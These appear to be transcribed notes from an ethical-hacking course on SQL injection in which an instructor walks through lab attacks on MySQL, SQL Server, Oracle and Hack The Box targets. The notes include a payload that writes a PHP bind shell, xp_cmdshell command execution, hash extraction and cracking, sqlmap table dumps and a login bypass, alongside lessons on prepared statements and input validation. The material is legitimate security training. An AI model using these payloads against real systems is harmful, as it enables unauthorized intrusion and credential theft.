> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=96)** and in the temp folder. And we have a, my test file when we cat my test, this is my test data. So the testing file has been created. This file can be script code, for example, a [PHP](../../Skills/Software%20Development/PHP.md) file. Of course we can't remotely execute PHP code from temp and we can't upload into a web folder from util. Now, what we really want is to be able to write executable strips into a remotely accessible web folder, which if we have a generally available upload folder, we may be able to do so. However, let's run the command again, this time uploading a PHP script file and we do union select and we're going to upload is PHP system and, nc minus lp, 2222 minus e slash bin slash bash. So that we'll run that cat and listen on port 2, 2, 2, 2, and we'll close that off. And 2, 3, 4, 5 into out file slash temp slash
>
> **[3:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=188)** net dot PHP and close off our injection. And we'll run that. And when we look at the temp folder, we can see our net dot PHP file has been uploaded.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [PHP](../../Skills/Software%20Development/PHP.md) (6)
> **CLI Commands:** php (6), cat (2)
> **Env Vars:** php (6)
> **Ports:** port 2 (1)
> **Tools:** bash (1)
> **Analogies:** for example (1)
> **Speakers:** - now (1)

#### [Cracking the MySQL hash](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=0)** - Often our objective when doing an [SQL](../../Skills/Data%20Science/SQL.md) injection is to obtain credentials. And just as often, the password is likely to be hashed. It's useful, therefore, to be able to crack hashes we find in SQL systems. When we create a user in SQL, we've already seen the form of hash we get. Let's look at Marcus again. We'll use my SQL. And we'll select user comma password from user. Now let's select this hash and try to crack it in crack station. I'll paste it in. I'll confirm that I'm a real person, and crack the hash. And crack station recognizes that this is my SQL hash and it's easily cranked. I've got to file with another hash that we might find in an SQL database. Cat Hash MD five. And we can see this looks different. It starts with dollar signs. I'll copy this. I'll paste it into crank station again. I'm not a robot and I'll crack it, but it's an unrecognized hash format. Let's take a look at the hash count website where we see different types of hash formats. If we scroll down to hash mode 500, we can see this looks similar to the hash we found.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=94)** It looks like we've got to salted MD five hash. We can now try hash cat to recover the passwords. For the purpose of this exercise, I've set up a small dictionary called my words. And we'll use that to demonstrate how to crack the salted MD five password. Hash cats. NSM 500. Hash MD five. And we'll use my words as the password file. and hash cut recovers the password, which is in fact hash cat.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (6)
> **Env Vars:** sql (6), nsm (1)
> **CLI Commands:** cat (3), find (2)
> **UI Navigation:** scroll down (1)
> **Analogies:** similar to (1)
> **Prerequisites:** set up (1)
> **Speakers:** - often (1)

#### [Injecting Microsoft SQL Server](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=0)** - [Instructor] [SQL server](../../Skills/Software%20Development/Microsoft%20SQL%20Server.md) express comes as a free download for [Windows 10](../../Skills/Network%20and%20System%20Administration/Windows%2010.md). I've got it installed on my windows 10 system, so let's go to the SQL server management studio. I'll take the default, [SQL](../../Skills/Data%20Science/SQL.md) express instance, which in my case is shuttle SQL express. And we now have access to the instance in the management console. Let's make sure we set up to use transactional queries, let's select tools, options, query execution, SQL server, general, and check the box by default, open new queries in SQL command mode and okay. Let's also right click on the shuttle SQL express connection and select facets. We'll change the dropdown to service security and set XP command shell enabled to true, okay, okay. Ignore the message about server agents and close the dialogue. We can make a new database by right clicking [Databases](../../Skills/Software%20Development/Databases.md) and then entering the name Cleo. New database, Cleo, okay. And if we expand databases, we can see we have Cleo. We can import our Pharos table by right clicking on the Cleo database, selecting tasks import flat file
>
> **[1:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=102)** and we'll specify the input file, which we have in our exercise folder. We'll click next and next and we'll set up the column names, which are Phid and which will make a small lint. Name, make the verchar to two.
>
> **[2:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=141)** We'll put reign start, we'll just leave it as that. Reign end, dynasty and tomb as verchar eight.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=165)** I won't bother with keys so we can just click next and finish, and close. Now we can use our [Windows](../../Glossary/Service/Windows.md) command shell to execute transactional queries on the database. We, the SQL command program to connect to the SQL instance. Let's see what databases we have. Select name from sys dot databases, go
>
> **[3:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=197)** and we list our databases. Let's use our Cleo database. Use Cleo, go. We can run a union select on this. Select name, from pharaoh union, select testing, go
>
> **[3:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=226)** and when we get the results. Note the entry testing is in sort order in the results. We can access SQL server system names. Select no from pharaoh
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=245)** union select quote dollar bracket, SQLCMD user
>
> **[4:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=253)** to get our current user bracket quote, go, and we get our username, which is user. If the instance has the command shell extended procedure configured, we can use this to run system commands. Execute, XP, command shell, who am I, go and where NT service MSSQL dollar, SQL express.
>
> **[4:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=289)** If we encounter errors with command shell, it may be because it's not enabled. However we can enable it, if we're a sys admin. Let's see how we check, if we're a sys admin. We do this with select, no from Pharaoh union select
>
> **[5:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=312)** is server role member, sys admin, go
>
> **[5:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=325)** and we get a zero and a one back, the zero is the integer interpretation of the blank field and one is the sys admin flag. Indeed, we are a sys admin. Now, if we want to enable XP command shell, we can do that with four commands. Execute, SP, configure show advanced options, comma one.
>
> **[5:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=356)** Reconfigure, execute, SP configure XP, command shell, comma one,
>
> **[6:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=378)** reconfigure and go. In our case, we see that command shell has changed from one-to-one, we were already enabled for it. We can't use the XP command shell directly in the union, but if we have a multiline option on, then we can add it to the end of the line. Select no from pharaoh union select no execute, XP command shell, dir C code on slash users and go, and we get our directory listing out. There are other ways to access system capabilities. For example, using the cyst DMOS enumerate file system functions to list text files. We'll go and we found a user dot text file our normal pen testing flag. There are many of the cysts stored in extended procedures in SQL server, but these contend to be somewhat unreliable. Nevertheless, it's worth spending a bit of time exploring them.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (7), [Sql server](../../Skills/Software%20Development/Microsoft%20SQL%20Server.md) (5), [Databases](../../Skills/Software%20Development/Databases.md) (5), [Windows 10](../../Skills/Network%20and%20System%20Administration/Windows%2010.md) (2), [Windows](../../Glossary/Service/Windows.md) (1)
> **Env Vars:** sql (12), sqlcmd (1), mssql (1), dmos (1)
> **CLI Commands:** make (4)
> **Prerequisites:** set up (2), configure (2)
> **UI Navigation:** go to (1), dropdown (1)
> **Analogies:** for example (1)
> **Speakers:** - [instructor] (1)

#### [Injecting Oracle SQL Server](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=0)** - [Instructor] Another useful [SQL](../../Skills/Data%20Science/SQL.md) system to look at is Oracle, and it too has a slightly different way of accessing database information. Oracle XE is a free download for [Windows](../../Glossary/Service/Windows.md) and [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) and is available from the website shown here. I've already downloaded this, extracted the zip file and installed it. Let's see how we use it. We can start the client by saying sqlplus / as sysdba,
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=27)** and we get the SQL prompt. Oracle comes with a core database, and it also has the option for application-specific [Databases](../../Skills/Software%20Development/Databases.md) called pluggable containers. We can see the current database we're using by typing show con_name; which shows we're using the core database. We can see what pluggable databases we have by entering show pdbs; Okay, we can see all tables in the database by running the query select table_name from all_tables;
>
> **[1:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=69)** and there's rather a lot of them. We can restrict this, somewhat, to use a tables by entering select table_name from user_tables;
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=85)** but, again, there's quite a lot. If we scroll up, we can see our Pharaoh table, so let's go query it. We may wish to format our outputs, and we can do that by setting field widths using the col command. Col name format a32.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=106)** Col dynasty format 99. Col tomb format a8. Okay, let's list our Pharaohs. Select name,dynasty,tomb from pharaoh;
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=133)** as expected, we can use the normal SQL where like an order by clauses. So we'll select our Pharaohs, where name like 'A%; order by name;
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=154)** More importantly, for our injections, we can do a union as well. Prior to Oracle 11g, we could obtain the password DES-based hash from the password field, let's use a union to get that. Select name,tomb from pharaoh where 1=0,
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=178)** which will suppress our pharaoh names, union select name,password from sys.user$,
>
> **[3:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=194)** and we'll limit it to where name='SYS'.
>
> **[3:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=202)** We've suppressed our pharaoh output by forcing faults, and the output from sys.user$ shows the name and a blank password hash field. We can check what password versions are in use by saying, select password_versions from dba_users
>
> **[3:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=227)** where username='SYS'; and we can see that for the sys.user it's 11G and 12C. From 11G onwards, the password field is null and we need to use the spare for field, which is an SHA-1 hash. We can also use the CONCAT function to build a multi-field string. Select concat concat name,' ' ,spare4 from sys.user$
>
> **[4:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=272)** where name='SYS'; and we get the entry for the sys.user where we see the 11G hash, shown with the S prefix, and the 12C hash, shown with the T prefix. Oracle is a bit different to [MySQL](../../Skills/Software%20Development/MySQL.md) and [SQL server](../../Skills/Software%20Development/Microsoft%20SQL%20Server.md), but it's still a target for SQL injections using similar techniques to those we've been looking at.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (4), [Databases](../../Skills/Software%20Development/Databases.md) (2), [Windows](../../Glossary/Service/Windows.md) (1), [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) (1), [MySQL](../../Skills/Software%20Development/MySQL.md) (1)
> **Env Vars:** sql (5), sys (3), des (1), sha (1), concat (1)
> **Code Identifiers:** table_name (2), con_name (1), all_tables (1), user_tables (1), password_versions (1)
> **Definitions:** is a  (2), is an  (1)
> **CLI Commands:** mysql (1)
> **UI Navigation:** scroll up (1)
> **Exercise Files:** zip file (1)
> **Speakers:** - [instructor] (1)


### 3. Automating SQL Injection Exploits

[↑ Back to Table of Contents](#table-of-contents)

#### [Inferring TRUE when blind](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=0)** - Sometimes we can try an [SQL](../../Skills/Data%20Science/SQL.md) injection and all we see is an error message such as, username not known, and we have no idea whether the query ran or not. It may have done, but we're blind as far as the results that came from it. Let's see how we handle that using our [MySQL](../../Skills/Software%20Development/MySQL.md) user table. Sudo, MySQL -U, root. Use MySQL, and let's select password from user where user equals Marcus. Okay, we get our password hash. But let's assume that we have a form asking for a name and a password. Even when we try to run an SQL injection, we may not see any results other than an error message. In such cases, it can be quite useful to have a way to know that our injection was successful. If we can't get SQL to tell us that, then we need to infer that it was successful by triggering an event that we can detect. And this is referred to as blind SQL injection or inferential injection. Let's do our union SQL injection attack, but in our select we'll use the special sleep function. Select password from user where user equals Marcus, union, select sleep five from user
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=93)** where password like star 1%.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=105)** And that returns straightaway. The function sleep five did not get executed. Let's run that again and use the phrase like star two. And this returns after five seconds. The sleep function did get executed. We know the first character of the hash is star, and now that we've executed a sleep, we can infer therefore that the next character is two. Similarly, when we run like 2A, we return straight away.
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=140)** Like 2B, return straight away, Like 2C, sleeps for five seconds. So our next character is C. And we can continue this until we recover the complete hash. Blind SQL queries are extremely powerful and used a lot in tools such as SQL Map, but they can be quite slow at recovering large amounts of data.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (7), [MySQL](../../Skills/Software%20Development/MySQL.md) (3)
> **Env Vars:** sql (7)
> **CLI Commands:** mysql (3), sudo (1)
> **Analogies:** such as (2)
> **Definitions:** is an  (1)
> **Speakers:** - sometimes (1)

#### [Using prepared SQL queries](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=0)** - [Instructor] Let's think about how we might code [SQL](../../Skills/Data%20Science/SQL.md) queries to understand the way in which we need to protect them. We'll start with a simple [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) program as shown here, nano sql1.py. All we do is open the SQL database, request the pharaoh ID, select the correct record, and then print the pharaoh's name, dynasty and tomb. Let's run that, python3 sql1.py.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=39)** We'll request pharaoh ID, 175. Our code works. And here we have Cleopatra II. Let's check pharaoh ID 50. And we find it's Kamose. Now let's run an SQL injection attack, or 1=1.
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=64)** And we get them all. Let's see how we can make our routine safe. Our first option is to use a prepared statement. Let's see what that looks like in code by updating our Python script, nano safesql1.py.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=92)** We now use the parameter, prepared=True, when setting up the cursor. And we execute the query as a pre-coded statement and variable value. Let's now run it, python3 safesql1.py.
>
> **[1:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=119)** So let's enter 50. And again, we get Kamose. And now, let's run an SQL injection attack, or 1=1.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=136)** And this time it doesn't get through. We're now safe from basic injection.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (4), [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) (2), cursor (1)
> **CLI Commands:** python (2), python3 (2), find (1), make (1)
> **File Paths:** sql1.py (2), safesql1.py (2)
> **Env Vars:** sql (4)
> **UI Navigation:** open the (1), select the (1)
> **Speakers:** - [instructor] (1)

#### [Getting our first sqlmap injection](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=0)** - One of the important pen testing tools for targets using [SQL](../../Skills/Data%20Science/SQL.md) is SQL Map. Let's take a look at how we approach the initial penetration of the Europa web server on the [LinkedIn](../../Skills/Web%20Development/LinkedIn.md) Learning Lab using SQL Map. I've run an initial scan and we can see that it's ssh on port 22 on both http and https web services. Port 80 presents the Apache default web page, as does port 443. Let's look at our end map scan again. We can see the SSL certificate uses the subject name europacorp.[htb](../../Glossary/Service/HackTheBox.md) with alternative names of www.europacorp.htb and admin-portal.europacorp.htb. Let's add admin-portal.europacorp.htb to our host file.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=56)** Sudo nano /etc/hosts. And we'll put in 10.10.10.22 admin-portal.europacorp.htb
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=82)** and we'll save that. I'll start at BurpSuite and we'll turn off interception and in our target scope, we'll add admin-portal.europacorp.htb.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=107)** Okay, on our website, we'll select preferences, network settings, and manual proxy. Okay, and we'll now go to admin-portal dot
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=140)** https admin-portal.europacorp.htb.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=152)** We'll accept the risk and continue. And we have a login page. This is looking for an email address and a password. Let's send in a request with a test email address and then check the message exchanges in BurpSuite. Test at test dot nz. And we'll use password. Back in BurpSuite, we can see we've recorded our login post. When we check it out, we see our credentials are at the bottom of the message. We can use SQL Map to check the parameter string containing the credentials by using the dash dash data switch to provide the data portion of the post. SQL Map minus u https admin-portal.europacorp.htb
>
> **[3:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=215)** minus minus data equals, and we'll put our data string in, email=test%40test.nz&password=password.
>
> **[4:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=244)** Okay, we'll let SQL Map run to its natural conclusion and then come back and look at the results. SQL Map hasn't found anything at this stage, but let's make it try harder by forcing it to focus on the [MySQL](../../Skills/Software%20Development/MySQL.md) database. We'll also give it the login [PHP](../../Skills/Software%20Development/PHP.md) form directly. So login php and minus minus dbms=mysql.
>
> **[4:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=275)** Okay, we'll let that run to its natural conclusion. Okay, SQL Map is finished and we can now see that we've identified three ways to inject SQL. Let's list out the [Databases](../../Skills/Software%20Development/Databases.md). Minus minus dbs. And we can see the information schemer and admin databases. Let's see what tables are in the admin database. Minus D admin minus minus tables.
>
> **[5:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=315)** And we can see we have a users table and we'll dump out the contents. Minus T users minus minus dump. And we won't try and crack these. And here we have our users and password hashes.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (9), [Htb](../../Glossary/Service/HackTheBox.md) (8), [MySQL](../../Skills/Software%20Development/MySQL.md) (2), [PHP](../../Skills/Software%20Development/PHP.md) (2), [Databases](../../Skills/Software%20Development/Databases.md) (2)
> **Env Vars:** sql (9), ssl (1), php (1)
> **CLI Commands:** mysql (2), php (2), ssh (1), apache (1), sudo (1)
> **Ports:** port 22 (1), port 80 (1), port 443 (1)
> **Code Identifiers:** mysql (1)
> **Versions:** 10.10.10 (1)
> **UI Navigation:** go to (1)
> **Speakers:** - one (1)

#### [Sanitizing input to SQL](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=0)** - [Instructor] Let's look at a more complex example where we have a general purpose execution function which handles both single and multiple [SQL](../../Skills/Data%20Science/SQL.md) statements. I've got one prepared. There's sql2.py. Here, we're allowing for multiple statements in an SQL query. The function runsql, starting on line four, executes the query, and a cursor is returned. It then iterates over the cursor, and for each iteration, fetches the result. Then at line nine, for each result which has entries, it adds them to the results list. Let's run this. Python3, sql2.py, and we'll enter 175. And we get our result of Cleopatra II, again. Now let's do a more extensive injection. We'll terminate the query, and we'll use the [MySQL](../../Skills/Software%20Development/MySQL.md) database.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=73)** We'll select user and password from the user table, and then we'll revert back to our cleo database. We've now suppressed the Pharaoh output, but we get the list of users in the MySQL database. Again, we've taken advantage of having our input directly inserted into the SQL statement, and we've been able to code multiple statements in our injection. Let's see how we can make this more complicated SQL routine safe. It's not so simple to apply a prepared statement to a general purpose function covering multiple SQL statements. Nano safesql2.py. We can, however, simply validate our input. In this case, at line 20, we just need to check for quotation characters. We'll check for both single and double quotes with the code shown after the Pharaoh ID input. Okay, let's run that. Python3 safesql2.py. And we'll enter 50, and we get Kamose again. Now let's run our SQL injection attack. ' or 1=1# to get all entries.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/sanitizing-input-to-sql?u=76281980&t=174)** And this time it doesn't get through. We catch the injection attempt, and don't run it.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (6), cursor (2), [MySQL](../../Skills/Software%20Development/MySQL.md) (2)
> **Env Vars:** sql (6)
> **CLI Commands:** python3 (2), mysql (2), make (1)
> **File Paths:** sql2.py (2), safesql2.py (2)
> **Speakers:** - [instructor] (1)

#### [Inserting an SQL injection via Burp Suite](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inserting-an-sql-injection-via-burp-suite?u=76281980&t=0)** - Before we leave Europa, let's go back to our [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) capture and see what we can do with this. We'll right-click the post message and send it to the repeater. And we'll go to the repeater tab. We'll add our [SQL](../../Skills/Data%20Science/SQL.md) injection into the email address, quote, and we'll use the plus for a space or plus one equals one. Plus we'll limit the output to one plus and we'll terminate. Plus we'll put a space and we'll send that and we get a redirect response. So we'll follow the redirection and then we'll show the response in the browser. To do that we'll copy and paste and go. And we running now as a logged-in admin.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) (1), [SQL](../../Skills/Data%20Science/SQL.md) (1)
> **UI Navigation:** right-click (1), go to (1)
> **Env Vars:** sql (1)
> **Cross-References:** go back to (1)
> **Speakers:** - before (1)

#### [Following up with a second injection](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=0)** - Let's take a look at another [SQL](../../Skills/Data%20Science/SQL.md) injection using SQL map using the rapid server on 10.10.10.71 We don't have this in the [LinkedIn](../../Skills/Web%20Development/LinkedIn.md) Lab. So if you want to follow this yourself, you'll have to use the main hack the box system. Before we start we'll load [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) and proxy through it. (mouse clicking) We'll turn off interception and we'll add 10.10.10.71 to our scope.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=40)** Okay. We'll set our browser to proxy by going to Preferences, Network Settings, manual proxy configuration. Okay. I've already done reconnaissance on this target and found it has a web portal on port 8080 and a folder named complain. Let's connect to this 10.10.10.71 on port 8080
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=73)** in the complain folder. we're presented with what's called a Complain Management System. And note it says complain or not complaint. Let's register ourselves as a customer username user, password user 1, 2, 3, 4 customer. And our address 1 Strangely Rd Our mobile number is 050006007765
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=111)** and our address is a@b.c and were registered. Okay, now we've registered let's login. user with our password user 1, 2, 3, 4, and we're a customer. We'll leave the website here for the moment while we check out the vulnerabilities on this system. If we're on searchsploit using the keyword complain searchsploit complain. We can see the first entry is a blind SQL injection. Let's take a look at it and we'll copy /user/share/[exploitdb](../../Glossary/Service/Exploit-DB.md)/exploits/phb/webapps/
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=173)** 42968.txt to complain.txt
>
> **[3:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=183)** And let's have a look at that. nano complaint.txt Okay. We can see the exploit has details of the vulnerability and also an SQL map command. So let's copy that, We can use the SQL map statement, but we'll need to use the RAB typee address and use our own session ID. So we'll paste that and we'll go to Burp and check out the post message where we logged in. That's our login. We can see the message has the string [PHP](../../Skills/Software%20Development/PHP.md) sesh ID. Let's copy that
>
> **[3:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=235)** Copy that, Okay. We'll reconstruct the SQL map, command with that. we'll paste that in here And we'll change the address to10.10.71:8080/complain.
>
> **[4:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=274)** We'll also add -dbs to get a list of [Databases](../../Skills/Software%20Development/Databases.md).
>
> **[4:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=281)** - - dbs. Okay. We found a number of databases including one called secret. Let's choose that and take a look at what tables it holds. So we'll run that query again with -D secret and look for -- tables. And we can see, we have a users table let's dump that
>
> **[5:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=316)** - T users -- dump. And we get a set of users and hashes. We can save this in a temporary file and we'll crack using a dictionary based attack. And the file we'll use for the attack is /user/share/wordlists/rockyou.txt
>
> **[5:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=346)** And we're starting to crack the passwords. And out of the 10 accounts, we find four passwords for the ones we didn't get. We can try CrackStation. Let's try Kain.
>
> **[6:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/following-up-with-a-second-injection?u=76281980&t=364)** We'll paste that confirm we are a person and we'll crack the hash. We find this empty 5 hash and the password is doradaybendita. I won't run through the others, but if we did, we'd find that we failed to crack Zephon and Turel but we do find the [rest](../../Skills/Web%20Development/Representational%20State%20Transfer%20(REST).md). Okay. We've run our SQL injection using SQL map and obtain credentials from the database and crack them.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (8), [Databases](../../Skills/Software%20Development/Databases.md) (2), [LinkedIn](../../Skills/Web%20Development/LinkedIn.md) (1), [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) (1), [Exploitdb](../../Glossary/Service/Exploit-DB.md) (1)
> **Env Vars:** sql (8), rab (1), php (1)
> **File Paths:** b.c (1), 42968.txt (1), complain.txt (1), complaint.txt (1), user/share/wordlists/rockyou.txt (1)
> **CLI Commands:** find (4), php (1)
> **Versions:** 10.10.10 (3), 10.71 (1)
> **Ports:** port 8080 (2), :8080 (1)
> **Speakers:** - let (1), - t (1)
> **UI Navigation:** go to (1)

#### [Defeating the WAF](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=0)** - [Instructor] Let's take a look at another of the Hack The Box lab servers, Jarvis. And here we have a hotel site. We can navigate around a bit, but there's no active way to do anything. However, if we go to the Rooms or Dining & Bar pages, we can click on an entry, and we see we have a [PHP](../../Skills/Software%20Development/PHP.md) file with a parameter. If we add a quote to that, and enter, we get a very strange response from the website. So maybe we should check this out with [SQLmap](../../Glossary/Tool/SQLmap.md). So, sqlmap http:// 10.10.10. .143 /room .PHP /? Cod =1. We haven't found an injection, but we see that sqlmap recommends trying again with a random agent switch. So let's try that with - random agent. And we'll let the target use its own session ID. Okay, now we're getting somewhere, and the site looks like it's vulnerable. Let's check out its [Databases](../../Skills/Software%20Development/Databases.md). We'll run that again, with the switch, --dbs. And we have hotel, information_schema, [MySQL](../../Skills/Software%20Development/MySQL.md)
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=96)** and performance_schema. We're on familiar ground now. So let's check out the MySQL table. Database MySQL and --tables. And as expected we have a user table, so let's
>
